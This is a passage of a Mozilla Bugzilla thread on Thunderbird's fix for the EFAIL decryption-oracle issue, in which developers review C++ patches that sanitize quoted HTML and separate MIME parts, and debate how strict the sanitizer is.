          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976086">Splinter Review</a>
      </div>
    </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976050&amp;action=edit"
           title="Sanitize quoted HTML"
           class=""
        >Attachment #8976050</a> -
        Attachment is obsolete: true</div><div class="change">
        <a href="/attachment.cgi?id=8976054&amp;action=edit"
           title="Sanitize quoted HTML (cleaned-up)"
           class=""
        >Attachment #8976054</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="c73"><div class="comment" data-id="13281074" data-no="73"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-73" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15195308_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15195308_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-73"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-73" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c73">Comment 73</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 04:35 PDT" data-time="1526470559">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-73">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-73" data-comment-id="13281074">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8976085" name="attach_8976085" title="Sanitizer code cleanup">attachment 8976085</a> <a href="/attachment.cgi?id=8976085&amp;action=edit" title="Sanitizer code cleanup">[details]</a> <a href="/attachment.cgi?id=8976085&amp;action=diff" title="Sanitizer code cleanup">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976085'>[review]</a>
Sanitizer code cleanup

1. I removed the pref migration code, because that migration happened in 2012 and it should be long done. Even then, it only concerned users who had manually modified that pref. I think that was only a dozen users world-wide even back then, so that's surely useless code now.

2. Removed my debug code

3. Renamed one variable to be clearer

4. Moved the comment from the header to the implemetation file.

5. If you allow presentational stuff, then also allow CSS. That's the only logic change here. The change only affects users who manually changed this hidden pref. Again, only a handful users, probably.</pre></div><div class="change-set" id="c74"><div class="comment" data-id="13281595" data-no="74"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-74" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15195308_22599"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15195308_22599"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-74"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-74" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c74">Comment 74</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 07:55 PDT" data-time="1526482548">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-74">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-74" data-comment-id="13281595">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8976086" name="attach_8976086" title="Sanitize quoted HTML, v3">attachment 8976086</a> <a href="/attachment.cgi?id=8976086&amp;action=edit" title="Sanitize quoted HTML, v3">[details]</a> <a href="/attachment.cgi?id=8976086&amp;action=diff" title="Sanitize quoted HTML, v3">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976086'>[review]</a>
Sanitize quoted HTML, v3

Why are you attaching this again? I had already attached the very same patch but with a commit message in <span class="bz_obsolete"><a href="/attachment.cgi?id=8976054" name="attach_8976054" title="Sanitize quoted HTML (cleaned-up)">attachment 8976054</a> <a href="/attachment.cgi?id=8976054&amp;action=edit" title="Sanitize quoted HTML (cleaned-up)">[details]</a> <a href="/attachment.cgi?id=8976054&amp;action=diff" title="Sanitize quoted HTML (cleaned-up)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976054'>[review]</a>. I thought we had agreed that this was too drastic.</pre></div><div class="change-set" id="c75"><div class="comment" data-id="13281715" data-no="75"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-75" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15195308_22599"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15195308_22599"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-75"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-75" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c75">Comment 75</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 08:24 PDT" data-time="1526484271">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-75">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-75" data-comment-id="13281715">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8976085" name="attach_8976085" title="Sanitizer code cleanup">attachment 8976085</a> <a href="/attachment.cgi?id=8976085&amp;action=edit" title="Sanitizer code cleanup">[details]</a> <a href="/attachment.cgi?id=8976085&amp;action=diff" title="Sanitizer code cleanup">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976085'>[review]</a>
Sanitizer code cleanup

Thanks for the clean-up, looks good.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976085&amp;action=edit"
           title="Sanitizer code cleanup"
           class=""
        >Attachment #8976085</a> -
        Flags: review+</div></div></div><div class="change-set" id="c76"><div class="comment" data-id="13281763" data-no="76"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-76" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15195308_22599"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15195308_22599"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-76"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-76" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c76">Comment 76</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 08:34 PDT" data-time="1526484897">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-76">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-76" data-comment-id="13281763">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8976074" name="attach_8976074" title="Separate MIME parts from each other (for 52)">attachment 8976074</a> <a href="/attachment.cgi?id=8976074&amp;action=edit" title="Separate MIME parts from each other (for 52)">[details]</a> <a href="/attachment.cgi?id=8976074&amp;action=diff" title="Separate MIME parts from each other (for 52)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976074'>[review]</a>
Separate MIME parts from each other (for 52)

Review of <span class="bz_obsolete"><a href="/attachment.cgi?id=8976074" name="attach_8976074" title="Separate MIME parts from each other (for 52)">attachment 8976074</a> <a href="/attachment.cgi?id=8976074&amp;action=edit" title="Separate MIME parts from each other (for 52)">[details]</a> <a href="/attachment.cgi?id=8976074&amp;action=diff" title="Separate MIME parts from each other (for 52)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976074'>[review]</a>:
-----------------------------------------------------------------

::: mailnews/mime/src/mimeTextHTMLParsed.cpp
&#64;&#64; +36,5 &#64;&#64;
<span class="quote">&gt; +MimeDefClass(MimeInlineTextHTMLParsed, MimeInlineTextHTMLParsedClass,
&gt; +       mimeInlineTextHTMLParsedClass, &amp;MIME_SUPERCLASS);
&gt; +
&gt; +static int MimeInlineTextHTMLParsed_parse_line (const char *, int32_t,
&gt; +                                                   MimeObject *);</span >

Nit: Indentation.

&#64;&#64; +71,5 &#64;&#64;
<span class="quote">&gt; +     I'll just dump the charset we get in the mime headers into a
&gt; +     HTML meta http-equiv.
&gt; +     XXX Not sure, if that is correct, though. */
&gt; +  char *content_type =
&gt; +    (obj-&gt;headers</span >

Nit: That can go onto the previous line.

&#64;&#64; +118,5 &#64;&#64;
<span class="quote">&gt; +  nsString&amp; rawHTML = *(me-&gt;complete_buffer);
&gt; +  nsString parsed;
&gt; +
&gt; +  nsCOMPtr&lt;nsIDOMDocument&gt; document;
&gt; +  // in 61: RefPtr&lt;mozilla::dom::DOMParser&gt; parser = mozilla::dom::DOMParser::CreateWithoutGlobal(rv2); &lt;<a rel="nofollow" href="https://searchfox.org/comm-central/source/mailnews/import/winlivemail/nsWMUtils.cpp#143">https://searchfox.org/comm-central/source/mailnews/import/winlivemail/nsWMUtils.cpp#143</a>&gt;</span >

Nit: This line is really too long.

Can you please prepare a patch that works on current trunk. We'll worry about the branches later.

If you want to be nice, please put:
#if 1
  // Code for Gecko 61 and beyond:
  RefPtr&lt;mozilla::dom::DOMParser&gt; parser = mozilla::dom::DOMParser::CreateWithoutGlobal(rv2);
#else
  // Code for Gecjo 60 and below:
  nsCOMPtr&lt;nsIDOMParser&gt; parser = do_GetService(NS_DOMPARSER_CONTRACTID);
#endif

&#64;&#64; +124,5 &#64;&#64;
<span class="quote">&gt; +  nsresult rv = parser-&gt;ParseFromString(rawHTML.get(), &quot;text/html&quot;, getter_AddRefs(document));
&gt; +  NS_ENSURE_SUCCESS(rv, -1);
&gt; +
&gt; +  nsCOMPtr&lt;nsIDocumentEncoder&gt; encoder = do_CreateInstance(
&gt; +      &quot;&#64;mozilla.org/layout/documentEncoder;1?type=text/html&quot;);</span >

Nit: Indentation.

&#64;&#64; +138,5 &#64;&#64;
<span class="quote">&gt; +  // needs the entire doc to make sense of the glibberish that people write.
&gt; +
&gt; +  NS_ConvertUTF16toUTF8 resultCStr(parsed);
&gt; +  status = ((MimeObjectClass*)&amp;MIME_SUPERCLASS)-&gt;parse_line(
&gt; +                             resultCStr.BeginWriting(),</span >

Nit: Indentation, perhaps the first argument fits onto the previous line, then align under it.</pre></div><div class="change-set" id="c77"><div class="comment" data-id="13282648" data-no="77"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-77" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15195308_22599"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15195308_22599"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-77"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-77" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c77">Comment 77</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 13:25 PDT" data-time="1526502313">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-77">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-77" data-comment-id="13282648">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8976085" name="attach_8976085" title="Sanitizer code cleanup">attachment 8976085</a> <a href="/attachment.cgi?id=8976085&amp;action=edit" title="Sanitizer code cleanup">[details]</a> <a href="/attachment.cgi?id=8976085&amp;action=diff" title="Sanitizer code cleanup">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976085'>[review]</a>
Sanitizer code cleanup

Can you please rebase this for trunk.</pre></div><div class="change-set" id="c78"><div class="comment" data-id="13282686" data-no="78"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-78" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a15195308_22599"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a15195308_22599"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-78"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-78" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c78">Comment 78</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 13:36 PDT" data-time="1526503000">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-78">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-78" data-comment-id="13282686">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8976085" name="attach_8976085" title="Sanitizer code cleanup">attachment 8976085</a> <a href="/attachment.cgi?id=8976085&amp;action=edit" title="Sanitizer code cleanup">[details]</a> <a href="/attachment.cgi?id=8976085&amp;action=diff" title="Sanitizer code cleanup">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976085'>[review]</a>
Sanitizer code cleanup

Review of <span class="bz_obsolete"><a href="/attachment.cgi?id=8976085" name="attach_8976085" title="Sanitizer code cleanup">attachment 8976085</a> <a href="/attachment.cgi?id=8976085&amp;action=edit" title="Sanitizer code cleanup">[details]</a> <a href="/attachment.cgi?id=8976085&amp;action=diff" title="Sanitizer code cleanup">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976085'>[review]</a>:
-----------------------------------------------------------------

::: mailnews/mime/src/mimemoz2.cpp
&#64;&#64; +2201,5 &#64;&#64;
<span class="quote">&gt;      &amp;dropMedia);
&gt;    if (dropPresentational)
&gt;      flags |= nsIParserUtils::SanitizerDropNonCSSPresentation;
&gt; +  else
&gt; +    flags |= nsIParserUtils::SanitizerAllowStyle;</span >

I thought no-styles was a feature for this particular code...</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976085&amp;action=edit"
           title="Sanitizer code cleanup"
           class=""
        >Attachment #8976085</a> -
        Flags: review?(mkmelin+mozilla) &rarr; review+</div></div></div><div class="change-set" id="c79"><div class="comment" data-id="13282742" data-no="79"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-79" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15195308_22599"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15195308_22599"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-79"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-79" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c79">Comment 79</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 14:00 PDT" data-time="1526504405">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-79">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8976330"
         class="attachment patch obsolete"
         data-id="8976330" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="efail-parse-html-3.diff">
      <meta itemprop="contentSize" content="15926">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8976330">
          <a class="link" href="attachment.cgi?id=8976330&amp;action=diff">
        <span id="att-8976330-description" itemprop="description">Separate MIME parts from each other (for trunk)</span></a> (obsolete)
        — <a href="attachment.cgi?id=8976330&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976330">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-79" data-comment-id="13282742">Ben, can you please provide patches that compile on trunk. I've fixed this and I also addressed the style nits.

I've also included the code for TB 60 and below (untested).</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976074&amp;action=edit"
           title="Separate MIME parts from each other (for 52)"
           class=""
        >Attachment #8976074</a> -
        Attachment is obsolete: true</div><div class="change">
        <a href="/attachment.cgi?id=8976074&amp;action=edit"
           title="Separate MIME parts from each other (for 52)"
           class=""
        >Attachment #8976074</a> -
        Flags: <span class="activity-deleted">review?(mkmelin+mozilla)</span></div><div class="change">
        <a href="/attachment.cgi?id=8976330&amp;action=edit"
           title="Separate MIME parts from each other (for trunk)"
           class=""
        >Attachment #8976330</a> -
        Flags: review?(mkmelin+mozilla)</div></div></div><div class="change-set" id="c80"><div class="comment" data-id="13282767" data-no="80"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-80" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15195308_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15195308_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-80"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-80" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c80">Comment 80</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 14:04 PDT" data-time="1526504697">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-80">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-80" data-comment-id="13282767"><span class="quote">&gt; Ben, can you please provide patches that compile on trunk.</span >

My focus right now was TB 52.8.0, because that needs to get out the door. The APIs are different, as you are painfully aware.

(And also because Enigmail failed on trunk for me, and 60 crashed on startup.) 

Thanks for the update to trunk.</pre></div><div class="change-set" id="a15229836_22599"><div class="change" id="aa15229836_22599">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15229836_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_22599" id="a15229836_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15229836_22599"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15229836_22599">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15229836_22599">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 14:05 PDT" data-time="1526504727">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976074&amp;action=edit"
           title="Separate MIME parts from each other (for 52)"
           class=""
        >Attachment #8976074</a> -
        Attachment is obsolete: false</div></div></div><div class="change-set" id="a15229875_22599"><div class="change" id="aa15229875_22599">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15229875_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_22599" id="a15229875_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15229875_22599"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15229875_22599">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15229875_22599">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 14:06 PDT" data-time="1526504766">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976074&amp;action=edit"
           title="Separate MIME parts from each other (for 52)"
           class=""
        >Attachment #8976074</a> -
        Attachment description: Separate MIME parts from each other &rarr; Separate MIME parts from each other (for 52)</div></div></div><div class="change-set" id="c81"><div class="comment" data-id="13282785" data-no="81"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-81" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15229875_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15229875_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-81"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-81" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c81">Comment 81</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 14:11 PDT" data-time="1526505083">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-81">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-81" data-comment-id="13282785"><span class="quote">&gt; I thought we had agreed that this was too drastic.</span >

You and Magnus simply stated that. I never said that I agree. Both Patrick and me think that this is the way to go.

But I had an idea: The sanitizer is drastic also on presentational HTML, which is not required for security. I can drive the sanitizer in a mode that removes all the stuff potentially problematic for security, but keep presentational HTML like tables and &lt;font&gt; and CSS.

How about that?</pre></div><div class="change-set" id="c82"><div class="comment" data-id="13282799" data-no="82"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-82" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15229875_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15229875_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-82"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-82" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c82">Comment 82</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 14:14 PDT" data-time="1526505265">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-82">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-82" data-comment-id="13282799"><span class="quote">&gt; I thought no-styles was a feature for this particular code...</span >

It's only a secondary feature of the sanitizer, not the primary one. There's an existing pref for it, and with this code, the style would be enabled based on that pref. See point 5 of <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c73">comment 73</a>. I could rename the pref to be clearer, though, if you like?</pre></div><div class="change-set" id="c83"><div class="comment" data-id="13282825" data-no="83"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-83" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15229875_22599"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15229875_22599"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-83"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-83" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c83">Comment 83</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 14:23 PDT" data-time="1526505807">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-83">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-83" data-comment-id="13282825">At least on my test e-mail (<span class=""><a href="/attachment.cgi?id=8975458" name="attach_8975458" title="A1-dec-pgp-smime-html-reply.eml">attachment 8975458</a> <a href="/attachment.cgi?id=8975458&amp;action=edit" title="A1-dec-pgp-smime-html-reply.eml">[details]</a></span>) this works well.

We certainly need to get a try run for this, so updating it to trunk, painfully, since I've done all those ports myself, even the one in nsWMUtils.cpp. In fact, I asked Boris to provide a C++ interface which was created only for use in TB and can break any minute, since there is no test for it. Someone needs to write a gtest, if we're using this now in a central location and not just some &quot;Windows Live Mail&quot; import. See <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Port bug 1453869: Replace use of nsIDOMParser"
   href="/show_bug.cgi?id=1454842#c13">bug 1454842 comment #13</a>.

Here's your try:
